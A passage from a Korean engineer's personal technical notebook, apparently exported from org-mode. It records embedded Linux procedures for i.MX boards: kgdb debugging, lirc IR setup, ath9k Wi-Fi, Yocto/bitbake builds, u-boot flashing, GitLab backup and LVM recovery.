    CONFIG_KALLSYMS_ALL=y
    ```
2.  빌드  
    
    ```text
    Kernel Hacking
    CONFIG_DEBUG_INFO=y
    ```
    
    또는  
    Makefile 에서 KBUILD\_CFLAGS 에 -g 옵션을 추가후 빌드  
    
    ```text
    KBUILD_CFLAGS   := -Wall -Wundef -Wstrict-prototypes -Wno-trigraphs \
    		-fno-strict-aliasing -fno-common \
    		-Werror-implicit-function-declaration \
    		-Wno-format-security \
    		-std=gnu89 \
    		-g
    ```
3.  Kernel commnd line 설정  
    
    ```text
    kgdboc=ttymxc0,115200 kgdbwait
    ```
4.  gdb 설정부팅후 serial console을 닫고 gdb 실행  
    
    ```text
    (gdb) set remotebaud 115200
    (gdb) target remote /dev/ttyUSB0
    ```
5.  부팅후에 kgdb 설정하기  
    
    ```text
    enable
    $ echo "ttymxc0,115200" > /sys/module/kgdboc/parameters/kgdboc
    
    disable
    $ echo > /sys/module/kgdboc/parameters/kgdboc
    
    debug session 진입위한 interrupt
    $ echo g > /proc/sysrq-trigger
    ```


#### <span class="section-num">3.117.3</span> Kernel Module Debug {#kernel-module-debug}

1.  /sys/module/<module-name>/sections/.<section-name> 참조
2.  add-symbol-file  
    
    ```text
    (gdb) add-symbol-file <filename.ko> <text_section_load_address> [-s .<SECT> 
    <SECT_LOAD_ADDRESS>]*
    
    (gdb) add-symbol-file  drivers/mxc/gpu-viv/galcore.ko 0x7f000000 
    -s .data 0x7f01a250 -s .rodata 0x7f017b54 -s .bss 0x7f01a5b8
    ```


#### <span class="section-num">3.117.4</span> Oops Message Line 찾기 {#oops-message-line-찾기}

```text
[  174.507084] Stack:
[  174.507163]  ce0bd8ac 00000008 00000000 ce4a7e90 c039ce30 ce0bd8ac c0718b04 c07185a0
[  174.507380]  ce4a7ea0 c0398f22 ce0bd8ac c0718b04 ce4a7eb0 c037deee ce0bd8e0 ce0bd8ac
[  174.507597]  ce4a7ec0 c037dfe0 c07185a0 ce0bd8ac ce4a7ed4 c037d353 ce0bd8ac ce0bd8ac
[  174.507888] Call Trace:
[  174.508125]  [<c039ce30>] ? sd_remove+0x20/0x70
[  174.508235]  [<c0398f22>] ? scsi_bus_remove+0x32/0x40
[  174.508326]  [<c037deee>] ? __device_release_driver+0x3e/0x70
[  174.508421]  [<c037dfe0>] ? device_release_driver+0x20/0x40
[  174.508514]  [<c037d353>] ? bus_remove_device+0x73/0x90
[  174.508606]  [<c037bccf>] ? device_del+0xef/0x150
[  174.508693]  [<c0399207>] ? __scsi_remove_device+0x47/0x80
[  174.508786]  [<c0399262>] ? scsi_remove_device+0x22/0x40
[  174.508877]  [<c0399324>] ? __scsi_remove_target+0x94/0xd0
[  174.508969]  [<c03993c0>] ? __remove_child+0x0/0x20
[  174.509060]  [<c03993d7>] ? __remove_child+0x17/0x20
[  174.509148]  [<c037b868>] ? device_for_each_child+0x38/0x60
[  174.509241]  [<c039938f>] ? scsi_remove_target+0x2f/0x60
[  174.509393]  [<d0c38907>] ? __iscsi_unbind_session+0x77/0xa0 [scsi_transport_iscsi]
[  174.509699]  [<c015272e>] ? run_workqueue+0x6e/0x140
[  174.509801]  [<d0c38890>] ? __iscsi_unbind_session+0x0/0xa0 [scsi_transport_iscsi]
[  174.509977]  [<c0152888>] ? worker_thread+0x88/0xe0
[  174.510047]  [<c01566a0>] ? autoremove_wake_function+0x0/0x40
```

```text
$ gdb sd.o
$ list *(sd_remove+0x20)
```


### <span class="section-num">3.118</span> lirc and GPIO IR Receiver {#lirc-and-gpio-ir-receiver}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-19 수 12:28&gt;</span></span>  
gpio ir receiver 를 imx6 보드에 구현하기 위한 가장 좋은 방법은데비안 arm 패키지를 이용하는 것이다.  
바닐라 커널에 있는 gpio\_ir 드라이버를 이용해 보기도 해 보았지만실패했고 라즈베리 파이에서 이용한 드라이버를 수정한 openrex 드라이버를이용하고 lirc 프로그램도 yocto 나 소스 빌드는 실패하고 데비안패키지를 이용해서만 성공할 수 있었다.  


#### <span class="section-num">3.118.1</span> 데비안 패키지 가져오기 {#데비안-패키지-가져오기}

1.  <https://community.nxp.com/docs/DOC-330147>   
    위 가이드에 따라 ubuntu rootfs 를 만든다음 nfs로 부팅하여  
    lirc lircclient-dev 패키지 설치. 설치후 lirc 설정창에서  
    custom -> simple ir diode 선택, transmitter는 none 선택

2.  데비안 패키지 설치 파일들을 보드에 복사하고  
    irrecord 명령으로 키를 캡쳐한다.  
    
    ```text
    $ irrecord -d /dev/lirc0 lircd.conf
    ```

3.  시작 스크립트에 lircd 등록  
    
    ```text
    /etc/rc.local
    mkdir /var/run/lirc
    /usr/sbin/lircd -d /dev/lirc0 /etc/lirc/lircd.conf
    ```


#### <span class="section-num">3.118.2</span> key mapping {#key-mapping}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-02-24 금 17:42&gt;</span></span>  
irrecord로 캡쳐한 key를 사용하려면 irexec 나 irxevent 를 설정하여야한다.  

1.   irexec

    ~/.lircrc 파일에 key에 대한 실행 명령 설정  
    
    ```text
    begin
        remote = lircd.conf
        button = KEY_1
        prog   = irexec
        config = notify-send "start chromium"; chromium-egl
    end
    ```

2.   irxevent

    ubuntu 에서 irxevent 를 사용하려면 lirc-x 패키지를 설치하여야 한다  
    
    ```text
    $ apt install lirc-x
    ```
    
    irexec 와 마찬가지로 ~/.lircrc 파일에 key 에 대한 xevent를 등록한다.  
    
    ```text
    begin
        remote = lircd.conf
        button = KEY_UP
        prog   = irxevent
        config = Key Up CurrentWindow
    end
    ```

3.   시작메뉴 등록

    lirc 데몬은 ubuntu systemd 에서 enable 한다.  
    /etc/lirc/hardware.conf 파일을 보드에 맞게 수정하여야 한다.  
    REMODE\_DRIVER 의 dsp 를 삭제하고 REMODE\_DEVICE 에 /dev/lirc0를지정하였다.  
    
    ```text
    REMOTE_MODULES=""
    REMOTE_DRIVER=""
    REMOTE_DEVICE="/dev/lirc0"
    REMOTE_SOCKET=""
    REMOTE_LIRCD_CONF=""
    REMOTE_LIRCD_ARGS=""
    ```
    
    이와 함께 사용자 시작 프로그램에 irexec, 와 irxevent 를 등록한다.  
    /etc/rc.local에 등록해 보았으나 타이밍이 맞지 않은지 실패했다.  
    
    ```text
    //add start app
    irexec -d
    irxevent -d
    ```

4.   링크

    <http://www.lirc.org/html/irxevent.html>  
    <http://www.lirc.org/html/configuration-guide.html#converting-key-symbols-to-application-strings>  
    <https://help.ubuntu.com/community/LIRC#Configuration>  


### <span class="section-num">3.119</span> AR5B22 mini pcie 설정 {#ar5b22-mini-pcie-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-21 금 17:43&gt;</span></span>  
커널 3.0.35 버전에서 동작시키기 위해서는 backport 의 compat 패키지를설치하여야 한다.  

```text
$ insmod compat.ko sch_codel.ko sch_fq_codel.ko
$ modprobe ath9k

$ cat /etc/wpa_supplicant.conf
ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=users

eapol_version=1
fast_reauth=1
ap_scan=1

network={
	ssid="areinfo1"
	psk="areinfo2016"
	key_mgmt=WPA-PSK
	proto=WPA2
	pairwise=CCMP TKIP
	group=CCMP TKIP
	priority=1
	scan_ssid=1
}

$ wpa_supplicant -i wlan0 -B -c /etc/wpa_supplicant.conf
$ udhcpc -i wlan0
```


#### <span class="section-num">3.119.1</span> 커널 4.1.15 {#커널-4-dot-1-dot-15}

freescale imx6 kernel config  

```text
make CROSS_COMPILE=arm-none-linux-gnueabi-ARCH=arm imx_v7_defconfig
#
# Bus support
#
CONFIG_PCI=y
CONFIG_PCI_DOMAINS=y
CONFIG_PCI_SYSCALL=y
#
# PCI host controller drivers
#
CONFIG_PCIE_DW=y
CONFIG_PCI_IMX6
```

\*주의\* +CONFIG\_PCI\_MSI=y+ 부분은 선택하지 않는다.  

```text
CONFIG_WIRELESS=y
CONFIG_WIRELESS_EXT=y
CONFIG_WEXT_CORE=y
CONFIG_WEXT_PROC=y

CONFIG_CFG80211=m
CONFIG_CFG80211_WEXT=y

CONFIG_MAC80211=m
CONFIG_MAC80211_HAS_RC=y
CONFIG_MAC80211_RC_MINSTREL=y
CONFIG_MAC80211_RC_MINSTREL_HT=y
CONFIG_MAC80211_RC_DEFAULT_MINSTREL=y
CONFIG_MAC80211_RC_DEFAULT="minstrel_ht"
CONFIG_MAC80211_MESH=y
CONFIG_MAC80211_LEDS=y
CONFIG_RFKILL=y

CONFIG_WLAN=y
CONFIG_ATH_COMMON=m
CONFIG_ATH9K_HW=m
CONFIG_ATH9K_COMMON=m
CONFIG_ATH9K_BTCOEX_SUPPORT=y
CONFIG_ATH9K=m
CONFIG_ATH9K_PCI=y
CONFIG_ATH_CARDS=m
CONFIG_ATH9K_RFKILL=y
CONFIG_ATH9K_PCOEM=y
CONFIG_ATH9K_HTC=m
```

1.   연결 설정

    1.  암호 설정  
        
        ```text
        usage: wpa_passphrase <ssid> [passphrase]
        $ wpa_passphrase areinfo secret_password
        ```
    2.  connmanctl 사용  
        
        ```text
        $ connmanctl scan wifi
        $ connmanctl services
        *AO areinfo2             wifi_000e8e4d1699_617265696e666f32_managed_psk
        *A  areinfo1             wifi_000e8e4d1699_617265696e666f31_managed_psk
        $ connmanctl connect wifi_000e8e4d1699_617265696e666f32_managed_psk
        ```

2.   링크

    <https://wireless.wiki.kernel.org/en/users/Drivers/ath9k>  


### <span class="section-num">3.120</span> git 검색 {#git-검색}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-14 월 03:06&gt;</span></span>  


#### <span class="section-num">3.120.1</span> 파일내용 검색 {#파일내용-검색}

regex 를 지원하고 -l 옵션을 주면 검색어가 포함된 파일만출력한다.  

```text
$ git grep imx6.*dtsi
```


#### <span class="section-num">3.120.2</span> log 내용 검색 {#log-내용-검색}

```text
$ git log --oneline --grep imx28
```


#### <span class="section-num">3.120.3</span> 참조 {#참조}

<https://blog.outsider.ne.kr/849>  


### <span class="section-num">3.121</span> Yocto rootfs 변경 {#yocto-rootfs-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-25 금 14:00&gt;</span></span>  
Yocto 프로젝트에서 bitbake 로 이미지 rootfs 만 따로 빌드할 수 있다.  

```text
$ bitbake core-image-base -c rootfs -f -v
```

만들어진 rootfs 는 ${BSPDIR} 및의 아래 디렉토리에 위치한다.  

```text
tmp/work/imx28evk-poky-linux-gnueabi/core-image-base/1.0-r0/rootfs
```

문제는 rootfs 디렉토리 아래 파일들을 임의로 변경하고자 할 때그냥 디렉토리에 copy만 해서는 image 빌드시 적용이 되지 않는다는점이다.  
그래서 ROOTFS\_POSTPROCESS\_COMMAND 변수를 사용하여이 변수에 copy 명령을 설정하는 부분을 추가해야 한다.  

```text
my_postprocess_function() {
	/usr/bin/rsync -au ${BSPDIR}/local/bd-28/rootfs/* ${WORKDIR}/rootfs
}
ROOTFS_POSTPROCESS_COMMAND += "my_postprocess_function; "
```

\*주의\*   
rsync 명령시 update(-u) 옵션을 넣어 주어야 한다. 그렇지 않으면  
passwd 파일등도 업데이트 되어 문제가 발생할 수 있다.  
빌드 패키지 외에 파일만 업데이트 하기 위해서 -u 옵션을사용해야 한다.  

conf/local.conf 파일에는 function을 추가 할 수 없으므로  
fsl-release-bsp/sources/poky/meta/classes/rootfs-postcommands.bbclass  
파일에 추가하면 되는데 그러면 모두에 적용이 되므로  
fsl-release-bsp/sources/poky/meta/recipes-core/images 아래  
core-image-base.bb 파일을 core-image-base-imx28.bb 로 복사하고위 설정을 추가한 다음 빌드시 core-image-base-imx28 사용하면 된다.  

```text
$ cd fsl-release-bsp/sources/poky/meta/recipes-core/images
$ cp core-image-base.bb core-image-base-imx28.bb
// edit core-image-base-imx28.bb
$ cd fsl-release-bsp/bld-directory
$ bitbake core-image-base-imx28 -v
```


### <span class="section-num">3.122</span> bitbake 설정 변경 {#bitbake-설정-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-25 금 15:37&gt;</span></span>  
build/local.conf 파일 아래 변수를 설정  


#### <span class="section-num">3.122.1</span> build image 타입 변경 {#build-image-타입-변경}

```text
IMAGE_FSTYPES = "tar.bz2 ubifs"
```


#### <span class="section-num">3.122.2</span> build package 추가 {#build-package-추가}

```text
IMAGE_INSTALL_append = " imx-kobs mtd-utils tslib packagegroup-fsl-gstreamer1.0-full"
```


#### <span class="section-num">3.122.3</span> u-boot boot mode 설정 {#u-boot-boot-mode-설정}

```text
UBOOT_CONFIG = "nand"
```


#### <span class="section-num">3.122.4</span> ubifs build paramater 변경 {#ubifs-build-paramater-변경}

local.conf 에 설정해선 안되고  
fsl-release-bsp/sources/meta-fsl-arm/conf/machine/imx28evk.conf  
에 설정한다.  

```text
MKUBIFS_ARGS = "--min-io-size 2048 --leb-size 126976 --max-leb-cnt 3964"
UBINIZE_ARGS = "--min-io-size 2048 --peb-size 132072 --sub-page-size 2048"
MXSBOOT_NAND_ARGS = "-w 2048 -o 218 -e 126976"
```

MXSBOOT\_NAND\_ARGS 에 -o flag 무엇을 의미하느지 알 수 없다.  
하지만 위 설정은 MKUBIFS\_ARGS를 설정하는 것만으로  
ubifs 이미지를 만들기에 충분한 것 같다.  


### <span class="section-num">3.123</span> bitbake commands {#bitbake-commands}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-25 금 16:13&gt;</span></span>  
-f 옵션은 강제 실행을 한다. 때론 변경 사항이 반영되지 않을 때필요하다.  

1.  image build  
    bitbake <image>  
    
    ```text
    $ bitbake core-image-base
    ```
2.  package의 특정 task 실행  
    bitbake <package> -c <task>  
    
    ```text
    $ bitbake linux-imx -c compile -f
    ```
    
    task 에는 fetch, unpack, patch, configure, compile, installpackage,  
    package\_write, build 등이 있고 실제 어떤 task가 존재하는지확인 하려면 아래 명령 실행
3.  package task list 보기  
    bitbake <package> -c listtasks  
    
    ```text
    $ bitbake core-image-base -c listtasks
    ```
4.  kernel config  
    
    ```text
    $ bitbake linux-imx -c menuconfig 
    ```
5.  layer 보기  
    
    ```text
    $ bitbake-layers show-layers 
    ```
6.  빌드 가능한 image 보기  
    
    ```text
    $ bitbake -s|grep -e -image-
    또는
    $ bitbake-layers show-recipes "*-image-*"
    ```

7.  이미지에 포함된 패키지나 외존성 보기  
    bitbake -g <pkg> && cat pn-depends.dot | grep -v -e '-native' |  
    grep -v digraph | grep -v -e '-image' | awk '{print $1}' | sort | uniq  
    
    ```text
    bitbake -g core-image-base && cat pn-depends.dot | grep -v -e '-native' | \
    grep -v digraph | grep -v -e '-image' | awk '{print $1}' | sort | uniq
    ```

8.  현재 yocto 설정에 패키지가 존재하는지 검색  
    bitbake -s | grep <pkg>  
    
    ```text
    $ bitbake -s | grep mtd
    ```

9.  링크  
    <https://community.nxp.com/docs/DOC-94953>


### <span class="section-num">3.124</span> u-boot usb 사용 {#u-boot-usb-사용}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-25 금 17:19&gt;</span></span>  


#### <span class="section-num">3.124.1</span> flash kernel {#flash-kernel}

```text
=> mtdparts default
=> mtdparts
device nand0 <gpmi-nand>, # parts = 7
 #: name		size		offset		mask_flags
 0: bootloader          0x00300000	0x00000000	1
 1: environment         0x00080000	0x00300000	0
 2: redundant-environment0x00080000	0x00380000	0
 3: kernel              0x00400000	0x00400000	0
 4: fdt                 0x00080000	0x00800000	0
 5: ramdisk             0x00800000	0x00880000	0
 6: filesystem          0x1ef80000	0x01080000	0

active partition: nand0,0 - (bootloader) 0x00300000 @ 0x00000000

defaults:
mtdids  : nand0=gpmi-nand
mtdparts: mtdparts=gpmi-nand:3m(bootloader)ro,512k(environment),512k(redundant-environment),4m(kernel),512k(fdt),8m(ramdisk),-(filesystem)

=> usb start
=> fatls usb 0:1
=> nand erase.part kernel
=> fatload usb 0:1 ${loadaddr} uimage-imx28evk.bin
=> nand write ${loadaddr} kernel
```


#### <span class="section-num">3.124.2</span> flash ubifs {#flash-ubifs}

```text
=> usb start
=> fatls usb 0:1
=> fatload usb 0:1 ${loadaddr} core-image-minimal-imx28evk.ubifs
=> nand erase.part filesystem
=> ubi create rootfs
=> ubi write ${loadaddr} rootfs ${filesize}
=> ubifsmount ubi0:rootfs
=> ubifsls
```


#### <span class="section-num">3.124.3</span> 링크 {#링크}

<https://community.nxp.com/thread/329105>  


### <span class="section-num">3.125</span> IMX28 mfgtools 용 펌웨어 빌드 {#imx28-mfgtools-용-펌웨어-빌드}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-29 화 18:03&gt;</span></span>  
ltib 버전에서 mfgtools 용 펌웨어를 빌드하기 위해서는 패치가필요하다. 현재 버전(L2.6.35\_1.1.0\_130130\_source) 에서는  
rootfs 사이즈가 4M 이하 에서만 동작하는데 기본 이미지가  
4M를 초과한다. 그래서 L2.6.35\_130130\_mfg\_updater.patch 를적용하고 mfgtools 용 펌웨어를 빌드한다. 패치 내용은  
initrd size를 6M 로 늘이고 그에따른 주소를 업데이트 하는것이다.  
빌드시 ltib 소스를 다시 압축해제 한다음 clean 상태에서패치하고 빌드하여야 한다. 그렇지 않으면 문제가 생기는데이유는 모르겠다.  

```text
1. Configure the firmware build profile as follows:
./ltib --selectype
2. Choose the following :
--- Choose the platform type
Selection (imx28) --->
--- Choose the packages profile
Selection (mfg firmware profile) --->
After LTIB completes the build, updater.sb and updater_ivt.sb 
will be created.
```

<https://community.nxp.com/thread/323008>  


### <span class="section-num">3.126</span> IMX28 porting {#imx28-porting}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-02 금 10:30&gt;</span></span>  
Yocto freesclale community bsp 를 이용한 imx28 보드 포팅방법이다.  


#### <span class="section-num">3.126.1</span> Build Yocto {#build-yocto}

freescale yocto release bsp는 community bsp 를 포함하고 있으므로그냥 release bsp 를 이용하여 빌드하였다.  

```text
$ mkdir fsl-release-bsp
$ cd fsl-release-bsp
$ repo init -u git://git.freescale.com/imx/fsl-arm-yocto-bsp.git -b imx-4.1-krogoth
$ repo sync
```

yocto fsl release를 sync 다음 부터 community bsp 빌드 방법을 사용한다.  

```text
$ source setup-environment bld-imx28
```

conf/local.conf 파일을 imx28evk 에 맞게 수정한다.  

```text
MACHINE ??= 'imx28evk'
DISTRO ?= 'poky'
...
UBOOT_CONFIG = "nand"
IMAGE_FSTYPES = " tar.bz2 ubifs"
IMAGE_INSTALL_append = " imx-kobs mtd-utils tslib packagegroup-fsl-gstreamer1.0-full"
```

build  

```text
$ bitbake core-image-base
// toolchain build
$ bitbake meta-toolchain
```


#### <span class="section-num">3.126.2</span> clone kernel {#clone-kernel}

1.  gitlab 서버에 로그인후 새 프로젝트를 만든다.
2.  현재 yocto kernel 저장소를 gitlab 서버의 새로만든 저장소에 push 한다.  
    
    ```text
    $ cd /home/ybgwon/Work/Freescale/MX6/LINUX/Yocto/L4.1.15_2.0.0-ga/\
    fsl-release-bsp/bd-28/tmp/work/imx28evk-poky-linux-gnueabi/linux-fslc/\
    4.4+gitAUTOINC+e79731d17c-r0/git
    $ git push --mirror git@debian:ybgwon/imx28evk.git
    ```
3.  gitlab 저장소를 clone 한다.  
    
    ```text
    $ git clone git@debian:ybgwon/imx28evk.git
    // 전체 브랜치를 복사하는 alias 를 만들고 실행한다.
    $ git config --global alias.clone-branches '! git branch -a | sed -n "/\/HEAD /d; /\/master$/d; /remotes/p;" | xargs -L1 git checkout -t'
    $ git clone-branches
    ```
4.  프로젝트를 설명하는 README.md 파일을 하나 만들어 준다.
5.  default config and custom dts 추가  
    imx28evk 보드의 default dts 파일은 mxs\_defconfig 이다.  
    dts 파일 왜에는 별 수정 사항이 없으므로 custom dts  
    파일만 만들고 빌드한다.  
    
    ```text
    $ cd arch/arm/boot/dts
    $ cp imx28-evk.dts imx28-evk-ahn.dts
    // Makefile 을 imx28-evk-ahn.dts 파일을 빌드하도록 수정
    $ make mxs_defconfig
    $ make -j8
    ```
6.  build script 추가  
    build image 를 저장할 out 디렉토리와 rootfs 를 반영할 rootfs  
    디렉토리를 추가하고 build script를 작성한다.


#### <span class="section-num">3.126.3</span> clone u-boot {#clone-u-boot}

1.  gitlab 서버에 로그인후 새 프로젝트를 만든다.
2.  현재 yocto kernel 저장소를 gitlab 서버의 새로만든 저장소에 push 한다.  
    
    ```text
    $ cd /home/ybgwon/Work/Freescale/MX6/LINUX/Yocto/L4.1.15_2.0.0-ga/\
    fsl-release-bsp/bd-28/tmp/work/imx28evk-poky-linux-gnueabi/u-boot-fslc/\
    v2016.07\+gitAUTOINC\+ae973bc45d-r0/git
    $ git push --mirror git@debian:ybgwon/u-boot-fslc.git
    ```
3.  gitlab 저장소를 clone 한다.  
    
    ```text
    $ git clone git@debian:ybgwon/imx28evk.git
    // 전체 브랜치를 복사하는 alias 를 만들고 실행한다.
    $ git config --global alias.clone-branches '! git branch -a | sed -n "/\/HEAD /d; /\/master$/d; /remotes/p;" | xargs -L1 git checkout -t'
    $ git clone-branches
    ```
4.  프로젝트를 설명하는 README.md 파일을 하나 만들어 준다.
5.  default config and custom dts 추가  
    imx28evk 보드의 default dts 파일은 mxs\_defconfig 이다.  
    dts 파일 왜에는 별 수정 사항이 없으므로 custom dts  
    파일만 만들고 빌드한다.  
    
    ```text
    $ cd arch/arm/boot/dts
    $ cp imx28-evk.dts imx28-evk-ahn.dts
    // Makefile 을 imx28-evk-ahn.dts 파일을 빌드하도록 수정
    $ make mxs_defconfig
    $ make -j8
    $ ./tools/mkimage -n ./arch/arm/cpu/arm926ejs/mxs/mxsimage.mx28.cfg \
    -T mxsimage -d ./arch/arm/cpu/arm926ejs/mxs/mxsimage.mx28.cfg u-boot.sb 
    ```
6.  build script 추가  
    build image 를 저장할 out 디렉토리와 rootfs 를 반영할 rootfs  
    디렉토리를 추가하고 build script를 작성한다.


### <span class="section-num">3.127</span> multi partition image mount {#multi-partition-image-mount}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-06 화 00:18&gt;</span></span>  
sdcard image 같이 multi-partition image를 mount 하려면  
fdisk 등으로 offset 을 알아내어 수동으로 mount 하여야 한다.  
자동으로 offset 을 구분하여 loop 디바이스를 만들어 주는  
util이 있다.  

```text
$ sudo apt install kpartx
$ sudo kpartx -a -v fsl-image-multimedia-imx28evk-20161124-6.rootfs.sdcard
add map loop0p1 (254:7): 0 2048 linear 7:0 2048
add map loop0p2 (254:8): 0 20480 linear 7:0 4096
add map loop0p3 (254:9): 0 139264 linear 7:0 24576
// mount partition
$ sudo mount /dev/mapper/loop0p2 tmp
$ sudo mount /dev/mapper/loop0p3 tmp2
// umount and delete partition device maping
$ sudo kpartx -d fsl-image-multimedia-imx28evk-20161124-6.rootfs.sdcard 
```

[stackexchange](http://raspberrypi.stackexchange.com/questions/13137/how-can-i-mount-a-raspberry-pi-linux-distro-image)  


### <span class="section-num">3.128</span> gvfs mount {#gvfs-mount}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-07 수 02:12&gt;</span></span>  
파일브라우저의 서버에 연결 메뉴는 samba, ssh, ftp 등 여러 프로토콜에대한 원격 연결을 그래픽 인터페이스에서 가능케 하여 매력적이다.  
하나 때론 이 연결을 command line 으로 하거나 이미 연결된부분에 대해서도 cli 에서 access하고자 할 때가 있다.  
그래서 gvfs-fuse 패키지를 설치하자. 다음은  
debian stretch에서 테스트 하였다.  

```text
$ sudo apt install gvfs-fuse
//리부트 후에 동작 확인이 가능하니 대략 난감
$ gvfs-mount smb://ybgwon-pc/data
$ gvfs-mount -l
```

mount 된 곳은 /run/user/1000(user id)/gvfs 아래이다.  


#### <span class="section-num">3.128.1</span> 링크 {#링크}

[askubuntu](http://askubuntu.com/questions/712290/mount-smb-share-with-gvfs-from-command-line)  


### <span class="section-num">3.129</span> gitlab backup and restore {#gitlab-backup-and-restore}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-12 월 18:37&gt;</span></span>  
주의. 같은 버전에서만 가능하다.  

1.  Original server(Backup)  
    
    ```text
    $ sudo gitlab-rake gitlab:backup:create
    $ sudo ls -l /var/opt/gitlab/backups/
    -rw------- 1 git git   69857280  7월  5 16:19 1467703174_gitlab_backup.tar
    -rw------- 1 git git 4465203200 12월 12 16:14 1481526817_gitlab_backup.tar
    -rw------- 1 git git  285214720 12월 12 17:36 1481531787_gitlab_backup.tar
    -rw------- 1 git git 3865835520 12월 12 18:36 1481535310_gitlab_backup.tar
    // copy backup file to backup-server
    $ sudo scp 1481535310_gitlab_backup.tar remote-server
    ```
2.  New server(Restore)  
    
    ```text
    $ sudo mv 1481535310_gitlab_backup.tar /var/opt/gitlab/backups
    // permision must be git.git
    $ sudo chown git.git /var/opt/gitlab/backups/1481535310_gitlab_backup.tar
    $ sudo gitlab-ctl stop unicorn
    $ sudo gitlab-ctl stop sidekiq
    // Verify
    $ sudo gitlab-ctl status
    
    $ sudo gitlab-rake gitlab:backup:restore RAILS_ENV=production BACKUP=1481535310
    
    $ sudo gitlab-ctl start
    $ sudo gitlab-rake gitlab:check SANITIZE=true
    ```

<https://www.icicletech.com/blog/gitlab-backup-made-easy>  
<https://docs.gitlab.com/ee/raketasks/backup%5Frestore.html>  


#### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.129.1</span> gitlab backup process 정리하기 {#gitlab-backup-process-정리하기}

1.   회사 gitlab 서버 (192.168.0.4) 백업 설정

    1.  WD cloud 에 백업하기 위해 /etc/fstab 설정  
        
        ```text
        //192.168.0.4/public	/mnt/wd-pub cifs guest,_netdev,uid=998,gid=998 0 0
        ```
    2.  /etc/gitlab/gitlab.rb 에서 백업 디렉토리를 마운트된 WD cloud 로 설정  
        
        ```text
        gitlab_rails['backup_upload_connection'] = {
          :provider => 'Local',
          :local_root => '/mnt/wd-pub'
        }
        gitlab_rails['backup_upload_remote_directory'] = 'Backups/gitlab_backups'
        gitlab_rails['backup_archive_permissions'] = 0644 
        gitlab_rails['backup_keep_time'] = 604800  # 7일간 보관
        ```
    3.  Reconfigure gitlab  
        
        ```text
        $ sudo gitlab-ctl reconfigure
        ```
    4.  root crontab 에 gitlab backup 설정  
        
        ```text
        0 2 * * * /opt/gitlab/bin/gitlab-rake gitlab:backup:create CRON=1
        ```
    5.  /etc/gitlab 아래 설정 파일들은 WD Cloud 의 ybgwon/Backup 디렉토리에저장
    6.  링크  
        [backup and restore](https://gitlab.com/gitlab-org/omnibus-gitlab/blob/master/doc/settings/backups.md#backup-and-restore-omnibus-gitlab-configuration)


### <span class="section-num">3.130</span> lvm 복구 {#lvm-복구}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-12-15 목 16:24&gt;</span></span>  
linuxmint new 버전이 출시되어 테스트해보려다 기존 lvm 데이터를날려버리고 부팅이 안되는 건 물론이고 기존 lvm 데이터에 아예 접근이불가한 상황이 발생했다.  
복구과정을 정리한다.  


#### <span class="section-num">3.130.1</span> 문제 발생 과정 {#문제-발생-과정}

1.  4T 하드디스크에 lvm을 설정하고 2T 논리볼륨에 linuxmint rosa 버전을설치하고 사용중.  
    
    ```text
    ybgwon@sul:~/yt/l4.1.15/k$ sudo gdisk -l /dev/sda
    GPT fdisk (gdisk) version 0.8.8
    
    Partition table scan:
    MBR: protective
    BSD: not present
    APM: not present
    GPT: present
    
    Found valid GPT with protective MBR; using GPT.
    Disk /dev/sda: 7814037168 sectors, 3.6 TiB
    Logical sector size: 512 bytes
    Disk identifier (GUID): 37CA358B-DE78-9C47-945B-9580118F6CE8
    Partition table holds up to 128 entries
    First usable sector is 34, last usable sector is 7814037134
    Partitions will be aligned on 2048-sector boundaries
    Total free space is 3693 sectors (1.8 MiB)
    
    Number  Start (sector)    End (sector)  Size       Code  Name
    1            2048         1050623   512.0 MiB   0700  
    2         1050624         1550335   244.0 MiB   0700  
    3         1550336      7814035455   3.6 TiB     8E00  
    ybgwon@sul:~/yt/l4.1.15/k$ sudo pvscan
    PV /dev/sda3   VG mint-vg   lvm2 [3.64 TiB / 1.68 TiB free]
    Total: 1 [3.64 TiB] / in use: 1 [3.64 TiB] / in no VG: 0 [0   ]
    ybgwon@sul:~/yt/l4.1.15/k$ sudo vgscan
    Reading all physical volumes.  This may take a while...
    Found volume group "mint-vg" using metadata type lvm2
    ybgwon@sul:~/yt/l4.1.15/k$ sudo lvscan
    ACTIVE            '/dev/mint-vg/root' [1.95 TiB] inherit
    ACTIVE            '/dev/mint-vg/swap_1' [15.92 GiB] inherit
    ```
2.  linuxmint sarah 버전이 출시되어 테스트 해보기위해 2T free space 중  
    30G 논리 볼륨을 만들고 sarah 를 이곳에 설치해보기 위해 설치디스크를 넣고 부팅
3.  설치 프로세스중 파티션 선택 메뉴에서 잘못하여 lvm 을 자동으로나누게 되고 준비한 볼륨에 설치할 수 없게 되어 설치 프로세스 중단
4.  이후 부팅이 안되고 이전 lvm 데이터에 억세스 안됨.


#### <span class="section-num">3.130.2</span> 복구 과정 {#복구-과정}

1.  linuxmint 설치시디로 부팅한 뒤 testdisk 설치
2.  testdisk 실행후 다행히 기존 데이터가 존재하는 걸 확인하고  
    /etc/lvm/archive 아래 lvm 백업 데이터를 복사  
    
    ```text
    $ sudo testdisk
    [ Create ] => select Disk /dev/sda and [ Proceed ] =>
    => [ Analyse ] => [ Quick Search ] => Enter P key(P: list files)
    => select lvm backup file and copy to live cd proper location
    ```

3.  restore lvm  
    
    ```text
    $ sudo vgchange -an mint-vg
    $ sudo vgcfgrestore -f -metadata-28672.txt -v mint-vg_00002-460813464.vg
    // if cant find uuid ... message you have to pvcreate first
    $ sudo pvcreate -ff -u 8cYXSr-l35B-2HBg-V7YS-TWsb-rZ8L-C5EC7J \
    --restorefile mint-vg_00002-460813464.vg /dev/sda3
    $ sudo vgcfgrestore -f -metadata-28672.txt -v mint-vg_00002-460813464.vg
    ```

4.  restore superblock  
